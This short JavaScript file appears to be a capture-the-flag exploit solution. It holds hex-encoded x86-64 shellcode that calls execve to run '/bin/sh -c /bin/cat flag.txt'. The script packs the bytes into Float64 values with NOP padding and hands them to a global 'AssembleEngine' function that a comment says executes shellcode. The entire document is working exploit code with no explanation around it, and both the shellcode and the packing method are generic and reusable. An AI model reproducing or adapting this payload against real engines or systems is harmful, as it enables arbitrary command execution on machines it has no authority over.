const str = "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x12\x00\x00\x00\x2f\x62\x69\x6e\x2f\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";

const shellcode = Array.from(str, ch => ch.charCodeAt(0));
buf = new ArrayBuffer(8);
u8 = new Uint8Array(buf);
f64 = new Float64Array(buf);

const payload = []

while(shellcode.length % 8 != 0) {
  shellcode.push(0x90);
}

for(let i = 0; i < shellcode.length; i++) {
  u8[i % 8] = shellcode[i];
  if((i+1) % 8 == 0) {
    payload.push(f64[0])
  };
}

// The new global function 'AssembleEngine' can execute shellcode, as f64
AssembleEngine(payload)
